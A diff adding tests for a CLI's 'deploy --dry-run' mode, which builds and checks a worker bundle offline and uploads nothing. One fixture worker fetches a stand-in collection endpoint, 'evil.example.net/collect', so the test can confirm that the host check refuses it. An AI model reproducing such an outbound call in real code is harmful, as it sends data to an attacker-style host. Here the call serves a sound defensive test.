@@ -437,6 +437,142 @@ export default { fetch: () => new Response(String(thing) + createHash + logo) };
   });
 });
 
+describe('tassyir deploy --dry-run: build and check, no sign-in, nothing sent', () => {
+  /** Not signed in, no app on Tassyir: --dry-run needs neither. */
+  async function offline(
+    changes: Record<string, string | null> = {},
+  ): Promise<Harness> {
+    const harness = await createHarness();
+    await project(harness, changes);
+    return harness;
+  }
+
+  it('builds and checks the hosted bundle, then stops: one document, exit 0', async () => {
+    const harness = await offline();
+    const result = await harness.run('deploy', '--dry-run', '--json');
+    expect(result.code).toBe(0);
+    expect(result.jsonLines()).toHaveLength(1);
+    expect(result.json()).toEqual({
+      ok: true,
+      dryRun: true,
+      uploaded: false,
+      app: { handle: 'review-requests' },
+      hosting: 'tassyir',
+      entry: 'src/worker.ts',
+      main: 'worker.js',
+      bytes: expect.any(Number) as number,
+      lockfile: 'package-lock.json',
+      warnings: [],
+      next: 'tassyir deploy',
+    });
+    expect(result.json()['bytes']).toBeGreaterThan(0);
+    expect(harness.fake.requests).toEqual([]);
+  });
+
+  it('tells a person what was built and that nothing was uploaded', async () => {
+    const harness = await offline({ 'package-lock.json': null });
+    const result = await harness.run('deploy', '--dry-run');
+    expect(result.code).toBe(0);
+    expect(result.stdout).toMatch(
+      /^✓ Built src\/worker\.ts into worker\.js \(\d+\.\d KB, no lockfile\); it passes the API's bundle rules and the scan's code checks\.\n {2}Nothing was uploaded \(--dry-run\)\./,
+    );
+    expect(result.stderr).toBe('');
+    expect(harness.fake.requests).toEqual([]);
+  });
+
+  it('refuses what deploy refuses, exit 4, and says to run the dry run again', async () => {
+    const harness = await offline({
+      'src/worker.ts': `export default {
+  async fetch(): Promise<Response> {
+    return fetch('https://evil.example.net/collect');
+  },
+};
+`,
+    });
+    const result = await harness.run('deploy', '--dry-run', '--json');
+    expect(result.code).toBe(4);
+    expect(result.json()['error']).toMatchObject({
+      code: 'BUNDLE_INVALID',
+      fix: expect.stringMatching(
+        /run `tassyir deploy --dry-run` again\.$/,
+      ) as string,
+      errors: [
+        expect.objectContaining({
+          code: 'BUNDLE_HOST_NOT_ALLOWED',
+          path: 'src/worker.ts:3',
+        }),
+      ],
+    });
+    const build = await harness.run(
+      'deploy',
+      '--dry-run',
+      '--entry',
+      'nope.ts',
+      '--json',
+    );
+    expect(build.code).toBe(4);
+    expect(build.json()['error']).toMatchObject({
+      code: 'BUNDLE_ENTRY_NOT_FOUND',
+    });
+    expect(harness.fake.requests).toEqual([]);
+  });
+
+  it('takes --entry, and warns that --app and --timeout are not used', async () => {
+    const harness = await offline({
+      'src/worker.ts': null,
+      'app/main.js': 'export default { fetch: () => new Response("ok") };\n',
+    });
+    const result = await harness.run(
+      'deploy',
+      '--dry-run',
+      '--entry',
+      'app/main.js',
+      '--app',
+      'review-requests',
+      '--timeout',
+      '0',
+      '--json',
+    );
+    expect(result.code).toBe(0);
+    expect(result.json()).toMatchObject({
+      entry: 'app/main.js',
+      warnings: [
+        '--app is not used by --dry-run (nothing is sent to Tassyir); ignored.',
+        '--timeout is not used by --dry-run (nothing is sent to Tassyir); ignored.',
+      ],
+    });
+    expect(harness.fake.requests).toEqual([]);
+  });
+
+  it('checks an external app’s manifest the same way, and sends nothing', async () => {
+    const harness = await offline({
+      'tassyir.app.toml': HOSTED.replace(
+        'mode          = "tassyir"\nallowed_hosts = ["graph.facebook.com"]',
+        'mode = "external"\nurl  = "https://reviews.acme-apps.dz"',
+      ),
+    });
+    const result = await harness.run('deploy', '--dry-run', '--json');
+    expect(result.code).toBe(0);
+    expect(result.json()).toMatchObject({
+      ok: true,
+      dryRun: true,
+      uploaded: false,
+      app: { handle: 'review-requests' },
+      hosting: 'external',
+      manifest: { hosting: { mode: 'external' } },
+      warnings: [],
+    });
+    const invalid = await offline({
+      'tassyir.app.toml': HOSTED.replace('api_version = "2026-10"', ''),
+    });
+    const refused = await invalid.run('deploy', '--dry-run', '--json');
+    expect(refused.code).toBe(4);
+    expect(refused.json()['error']).toMatchObject({ code: 'MANIFEST_INVALID' });
+    expect(harness.fake.requests).toEqual([]);
+    expect(invalid.fake.requests).toEqual([]);
+  });
+});
+
 describe('tassyir deploy, hosted: the verdict', () => {
   it('a failed scan lists every finding as the API sends it, with what to do (exit 1)', async () => {
     const harness = await ready({ script: ['dispatched', 'failed'] });
